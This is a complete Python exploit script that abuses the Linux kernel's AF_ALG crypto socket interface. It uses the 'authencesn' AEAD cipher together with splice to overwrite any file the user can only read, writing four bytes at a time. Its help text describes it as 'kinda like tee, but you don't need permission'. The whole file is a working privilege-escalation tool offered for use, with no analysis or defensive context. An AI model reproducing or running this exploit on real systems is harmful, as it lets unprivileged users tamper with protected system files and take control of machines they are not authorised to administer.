#!/usr/bin/env python3

import argparse
import os
import socket
import struct
import sys

AEAD_KEY = bytes.fromhex("0800010000000010" + "00" * 32)

AAD_LEN = 8
AUTH_SIZE = 4
OP = socket.ALG_OP_DECRYPT
IV = struct.pack("<I", 16) + b"\x00" * 16


def overwrite_chunk(file_fd: int, offset: int, four_bytes: bytes) -> None:
    sock = socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0)
    sock.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_KEY, AEAD_KEY)
    sock.setsockopt(socket.SOL_ALG, socket.ALG_SET_AEAD_AUTHSIZE, None, AUTH_SIZE)

    op_sock, _ = sock.accept()

    op_sock.sendmsg(
        [b"AAAA" + four_bytes],
        [
            (socket.SOL_ALG, socket.ALG_SET_IV, IV),
            (socket.SOL_ALG, socket.ALG_SET_OP, struct.pack("<I", OP)),
            (socket.SOL_ALG, socket.ALG_SET_AEAD_ASSOCLEN, struct.pack("<I", AAD_LEN)),
        ],
        socket.MSG_MORE,
    )

    splice_len = offset + 4

    pipe_r, pipe_w = os.pipe()
    os.splice(file_fd, pipe_w, splice_len)
    os.splice(pipe_r, op_sock.fileno(), splice_len)

    try:
        op_sock.recv(8 + offset)
    except OSError:
        pass

    os.close(pipe_r)
    os.close(pipe_w)
    op_sock.close()
    sock.close()


def main():
    parser = argparse.ArgumentParser(
        description="kinda like tee, but you don't need permission"
    )
    parser.add_argument("target", help="path to the file to overwrite")
    args = parser.parse_args()

    payload = sys.stdin.buffer.read()

    fd = os.open(args.target, os.O_RDONLY)
    try:
        for i in range(0, len(payload), AUTH_SIZE):
            overwrite_chunk(fd, i, payload[i : i + AUTH_SIZE])
    finally:
        os.close(fd)


if __name__ == "__main__":
    if os.getenv("I_DONE_READ_THE_DERN_SCRIPT") != "1":
        print("read the script first ya dingus")
        exit(1)
    main()
